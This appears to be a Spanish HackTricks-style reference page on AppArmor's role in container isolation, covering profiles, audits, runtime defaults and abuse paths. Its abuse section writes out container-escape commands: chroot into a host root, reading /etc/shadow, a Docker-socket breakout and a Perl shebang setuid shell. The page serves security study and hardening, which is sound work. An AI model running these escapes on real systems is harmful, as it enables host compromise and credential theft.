# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Función En El Aislamiento De Contenedores

## Descripción general

AppArmor es un sistema de **Mandatory Access Control** que aplica restricciones mediante perfiles específicos para cada programa. A diferencia de las comprobaciones DAC tradicionales, que dependen en gran medida de la propiedad del usuario y del grupo, AppArmor permite que el kernel aplique una política asociada al propio proceso. En entornos de contenedores, esto es importante porque un workload puede tener suficiente privilegio tradicional para intentar una acción y, aun así, ser rechazado porque su perfil de AppArmor no permite la ruta, el mount, el comportamiento de red o el uso de capabilities correspondiente.

El punto conceptual más importante es que AppArmor está **basado en rutas**. Considera el acceso al sistema de archivos mediante reglas de rutas, en lugar de utilizar labels como hace SELinux. Esto lo hace accesible y potente, pero también significa que los bind mounts y los layouts de rutas alternativos requieren una atención especial. Si el mismo contenido del host pasa a estar disponible mediante una ruta diferente, el efecto de la política puede no ser el que el operador esperaba inicialmente.

## Role In Container Isolation

Las revisiones de seguridad de contenedores suelen detenerse en capabilities y seccomp, pero AppArmor sigue siendo importante después de esas comprobaciones. Imagina un contenedor que tiene más privilegios de los que debería, o un workload que necesitaba una capability adicional por razones operativas. AppArmor todavía puede limitar el acceso a archivos, el comportamiento de los mounts, las redes y los patrones de ejecución de formas que detienen la vía de abuso más evidente. Por eso, deshabilitar AppArmor "solo para hacer que la aplicación funcione" puede transformar silenciosamente una configuración meramente arriesgada en otra que sea activamente explotable.

## Lab

Para comprobar si AppArmor está activo en el host, utiliza:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Para ver bajo qué se está ejecutando el proceso actual del contenedor:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
La diferencia es instructiva. En el caso normal, el proceso debería mostrar un contexto de AppArmor asociado al perfil elegido por el runtime. En el caso unconfined, esa capa adicional de restricción desaparece.

También puedes inspeccionar lo que Docker considera que ha aplicado:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Uso en tiempo de ejecución

Docker puede aplicar un perfil AppArmor predeterminado o personalizado cuando el host lo admite. Podman también puede integrarse con AppArmor en sistemas basados en AppArmor, aunque en distribuciones centradas en SELinux el otro sistema MAC suele ocupar el papel principal. Kubernetes puede exponer la política de AppArmor en el nivel de workload en los nodos que realmente admiten AppArmor. LXC y los entornos relacionados de system containers de la familia Ubuntu también utilizan AppArmor ampliamente.

El punto práctico es que AppArmor no es una "función de Docker". Es una función del kernel del host que varios runtimes pueden elegir aplicar. Si el host no lo admite o se indica al runtime que se ejecute sin confinamiento, la supuesta protección no está realmente presente.

En Kubernetes específicamente, la API moderna es `securityContext.appArmorProfile`. Desde Kubernetes `v1.30`, las anotaciones beta antiguas de AppArmor están obsoletas. En hosts compatibles, `RuntimeDefault` es el perfil predeterminado, mientras que `Localhost` apunta a un perfil que ya debe estar cargado en el nodo. Esto es importante durante una revisión porque un manifest puede parecer compatible con AppArmor y, aun así, depender completamente del soporte del nodo y de los perfiles precargados.<sup>[[1]](#references)</sup>

Un detalle operativo sutil pero útil es que establecer explícitamente `appArmorProfile.type: RuntimeDefault` es más estricto que simplemente omitir el campo. Si el campo se establece explícitamente y el nodo no admite AppArmor, la admisión debería fallar. Si se omite el campo, el workload todavía puede ejecutarse en un nodo sin AppArmor y simplemente no recibir esa capa adicional de confinamiento. Desde el punto de vista de un atacante, esta es una buena razón para comprobar tanto el manifest como el estado real del nodo.<sup>[[1]](#references)</sup>

En hosts compatibles con AppArmor de Docker, el perfil predeterminado más conocido es `docker-default`. Ese perfil se genera a partir de la plantilla de AppArmor de Moby y es importante porque explica por qué algunos PoCs basados en capabilities siguen fallando en un container predeterminado. En términos generales, `docker-default` permite el networking habitual, deniega las escrituras en gran parte de `/proc`, deniega el acceso a partes sensibles de `/sys`, bloquea las operaciones de mount y restringe ptrace para que no sea una primitive general de probing del host. Comprender esa línea base ayuda a distinguir entre "el container tiene `CAP_SYS_ADMIN`" y "el container realmente puede utilizar esa capability contra las interfaces del kernel que me interesan".

## Gestión de perfiles

Los perfiles de AppArmor suelen almacenarse en `/etc/apparmor.d/`. Una convención de nomenclatura habitual consiste en reemplazar las barras del path del ejecutable por puntos. Por ejemplo, un perfil para `/usr/bin/man` suele almacenarse como `/etc/apparmor.d/usr.bin.man`. Este detalle es importante tanto para la defensa como para la evaluación, porque una vez que conoces el nombre del perfil activo, normalmente puedes localizar rápidamente el archivo correspondiente en el host.

Entre los comandos útiles de gestión desde el host se incluyen:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
La razón por la que estos comandos son importantes en una referencia de seguridad de contenedores es que explican cómo se crean y cargan realmente los perfiles, cómo se cambia al modo complain y cómo se modifican después de realizar cambios en la aplicación. Si un operador tiene la costumbre de cambiar los perfiles al modo complain durante la resolución de problemas y olvida restaurar enforcement, el contenedor puede parecer protegido en la documentación, aunque en realidad se comporte de forma mucho más permisiva.

### Creación y actualización de perfiles

`aa-genprof` puede observar el comportamiento de una aplicación y ayudar a generar un perfil de forma interactiva:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` puede generar un perfil de plantilla que posteriormente se puede cargar con `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Cuando cambia el binario y es necesario actualizar la policy, `aa-logprof` puede reproducir las denegaciones encontradas en los logs y ayudar al operador a decidir si permitirlas o denegarlas:
```bash
sudo aa-logprof
```
### Logs

Las denegaciones de AppArmor suelen ser visibles mediante `auditd`, syslog o herramientas como `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Esto resulta útil desde el punto de vista operativo y ofensivo. Los defensores lo utilizan para perfeccionar los perfiles. Los atacantes lo utilizan para averiguar qué ruta u operación exacta se está denegando y si AppArmor es el control que bloquea una cadena de exploit.

### Identificar El Archivo Exacto Del Perfil

Cuando un runtime muestra el nombre de un perfil específico de AppArmor para un contenedor, a menudo resulta útil asociar ese nombre con el archivo de perfil en el disco:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Esto es especialmente útil durante la revisión del host porque conecta la diferencia entre «el container indica que se está ejecutando bajo el profile `lowpriv`» y «las reglas reales se encuentran en este archivo específico, que puede auditarse o recargarse».

### Reglas de alta relevancia para auditar

Cuando puedas leer un profile, no te detengas en las líneas `deny` simples. Varios tipos de reglas cambian considerablemente la utilidad de AppArmor frente a un intento de container escape:<sup>[[2]](#references)</sup>

- `ux` / `Ux`: ejecutan el binario objetivo sin restricciones. Si un helper, shell o interpreter accesible está permitido mediante `ux`, normalmente es lo primero que se debe probar.
- `px` / `Px` y `cx` / `Cx`: realizan transiciones de profile en `exec`. No son automáticamente peligrosas, pero conviene auditarlas porque una transición puede terminar en un profile mucho más permisivo que el actual.
- `change_profile`: permite que una tarea cambie a otro profile cargado, inmediatamente o en el siguiente `exec`. Si el profile de destino es más débil, esto puede convertirse en el escape hatch previsto para salir de un domain restrictivo.
- `flags=(complain)`, `flags=(unconfined)` o el más reciente `flags=(prompt)`: estos valores deberían cambiar el nivel de confianza que depositas en el profile. `complain` registra las denegaciones en lugar de hacerlas cumplir, `unconfined` elimina el límite y `prompt` depende de una ruta de decisión en userspace en lugar de una denegación aplicada exclusivamente por el kernel.
- `userns` o `userns create,`: las políticas más recientes de AppArmor pueden controlar la creación de user namespaces. Si un profile de container lo permite explícitamente, los user namespaces anidados siguen siendo posibles, incluso cuando la plataforma utiliza AppArmor como parte de su estrategia de hardening.

`grep` útil desde el host:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Este tipo de auditoría suele ser más útil que revisar cientos de reglas de archivos ordinarias. Si un breakout depende de ejecutar un helper, entrar en un nuevo namespace o escapar a un profile menos restrictivo, la respuesta suele estar oculta en estas reglas orientadas a transiciones, en lugar de en las líneas obvias de estilo `deny /etc/shadow r`.

## Misconfigurations

El error más obvio es `apparmor=unconfined`. Los administradores suelen establecerlo mientras depuran una aplicación que falló porque el profile bloqueó correctamente algo peligroso o inesperado. Si el flag permanece en producción, toda la capa MAC se ha eliminado en la práctica.

Otro problema sutil es asumir que los bind mounts son inofensivos porque los permisos de los archivos parecen normales. Como AppArmor se basa en rutas, exponer rutas del host bajo ubicaciones de montaje alternativas puede interactuar negativamente con las reglas basadas en rutas. Un tercer error es olvidar que un nombre de profile en un archivo de configuración significa muy poco si el kernel del host no está aplicando realmente AppArmor.

## Abuse

Cuando AppArmor desaparece, las operaciones que antes estaban restringidas pueden funcionar de repente: leer rutas sensibles mediante bind mounts, acceder a partes de procfs o sysfs cuyo uso debería haber sido más difícil, realizar acciones relacionadas con montajes si las capabilities/seccomp también lo permiten, o utilizar rutas que un profile normalmente denegaría. AppArmor suele ser el mecanismo que explica por qué un intento de breakout basado en capabilities "debería funcionar" en teoría, pero sigue fallando en la práctica. Elimina AppArmor y el mismo intento puede empezar a tener éxito.

Si sospechas que AppArmor es lo principal que impide una cadena de abuso basada en path-traversal, bind-mount o mount, el primer paso suele ser comparar qué queda accesible con y sin un profile. Por ejemplo, si una ruta del host está montada dentro del contenedor, empieza comprobando si puedes recorrerla y leerla:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Si el contenedor también tiene una capacidad peligrosa como `CAP_SYS_ADMIN`, una de las pruebas más prácticas consiste en comprobar si AppArmor es el control que bloquea las operaciones de montaje o el acceso a sistemas de archivos sensibles del kernel:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
En entornos donde una ruta del host ya está disponible mediante un bind mount, perder AppArmor también puede convertir un problema de information disclosure de solo lectura en acceso directo a archivos del host:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
El objetivo de estos comandos no es que AppArmor por sí solo cree el escape. Es que, una vez eliminado AppArmor, muchas vías de abuso basadas en el sistema de archivos y los montajes pueden probarse de inmediato.

### Ejemplo completo: AppArmor deshabilitado + raíz del host montada

Si el contenedor ya tiene la raíz del host montada mediante bind en `/host`, eliminar AppArmor puede convertir una vía de abuso del sistema de archivos bloqueada en un escape completo del host:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Una vez que el shell se está ejecutando a través del sistema de archivos del host, la carga de trabajo ha escapado efectivamente del límite del contenedor:
```bash
id
hostname
cat /etc/shadow | head
```
### Ejemplo completo: AppArmor deshabilitado + Runtime Socket

Si la barrera real fuera AppArmor alrededor del estado del runtime, un socket montado puede ser suficiente para lograr un escape completo:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
La ruta exacta depende del punto de montaje, pero el resultado final es el mismo: AppArmor ya no impide el acceso a la API del runtime, y la API del runtime puede iniciar un container que comprometa el host.

### Ejemplo completo: bypass de bind-mount basado en rutas

Dado que AppArmor se basa en rutas, proteger `/proc/**` no protege automáticamente el mismo contenido de procfs del host cuando es accesible mediante una ruta diferente:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
El impacto depende de qué se haya montado exactamente y de si la ruta alternativa también omite otros controles, pero este patrón es una de las razones más claras por las que AppArmor debe evaluarse junto con el diseño de montajes, no de forma aislada.

### Ejemplo completo: Shebang Bypass

En ocasiones, la política de AppArmor apunta a una ruta de intérprete de una forma que no tiene plenamente en cuenta la ejecución de scripts mediante el procesamiento de shebang. Un ejemplo histórico implicaba usar un script cuya primera línea apunta a un intérprete confinado:<sup>[[3]](#references)</sup>
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Este tipo de ejemplo es importante como recordatorio de que la intención del profile y la semántica de ejecución real pueden divergir. Al revisar AppArmor en entornos de containers, las cadenas de intérpretes y las rutas de ejecución alternativas merecen especial atención.

## Comprobaciones

El objetivo de estas comprobaciones es responder rápidamente a tres preguntas: si AppArmor está habilitado en el host, si el proceso actual está confinado y si el runtime aplicó realmente un profile a este container.
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Qué es interesante aquí:

- Si `/proc/self/attr/current` muestra `unconfined`, el workload no se está beneficiando del confinement de AppArmor.
- Si `aa-status` muestra que AppArmor está deshabilitado o no cargado, cualquier nombre de profile en la configuración del runtime es, en su mayor parte, meramente cosmético.
- Si `docker inspect` muestra `unconfined` o un custom profile inesperado, esa suele ser la razón por la que funciona una vía de abuso basada en el filesystem o en mounts.
- Si `/sys/kernel/security/apparmor/profiles` no contiene el profile que esperabas, la configuración del runtime o del orchestrator no es suficiente por sí sola.
- Si un profile supuestamente hardened contiene reglas del estilo `ux`, `change_profile` amplio, `userns` o `flags=(complain)`, el límite práctico puede ser mucho más débil de lo que sugiere el nombre del profile.

Si un container ya tiene privilegios elevados por razones operativas, mantener AppArmor habilitado suele marcar la diferencia entre una excepción controlada y un fallo de seguridad mucho más amplio.

## Defaults del Runtime

| Runtime / plataforma | Estado por defecto | Comportamiento por defecto | Debilitamiento manual común |
| --- | --- | --- | --- |
| Docker Engine | Habilitado por defecto en hosts compatibles con AppArmor | Usa el profile de AppArmor `docker-default` salvo que se sobrescriba | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Depende del host | AppArmor es compatible mediante `--security-opt`, pero el default exacto depende del host/runtime y es menos universal que el profile `docker-default` documentado por Docker | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Default condicional | Si no se especifica `appArmorProfile.type`, el default es `RuntimeDefault`, pero solo se aplica cuando AppArmor está habilitado en el node | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` con un profile débil, nodes sin soporte para AppArmor |
| containerd / CRI-O bajo Kubernetes | Sigue el soporte del node/runtime | Los runtimes compatibles con Kubernetes suelen soportar AppArmor, pero la enforcement real sigue dependiendo del soporte del node y de la configuración del workload | Igual que en la fila de Kubernetes; la configuración directa del runtime también puede omitir AppArmor por completo |

Para AppArmor, la variable más importante suele ser el **host**, no solo el runtime. Una configuración de profile en un manifest no crea confinement en un node donde AppArmor no está habilitado.

## Referencias

- [1] [Security context de Kubernetes: campos del profile de AppArmor y comportamiento del soporte del node](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [2] [Manpage `apparmor.d(5)` de Ubuntu 24.04: transiciones de exec, `change_profile`, `userns` y flags del profile](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
- [3] [HTB: Nunchucks - bypass del shebang de AppArmor con un script de Perl](https://0xdf.gitlab.io/2021/11/02/htb-nunchucks.html)

{{#include ../../../../banners/hacktricks-training.md}}
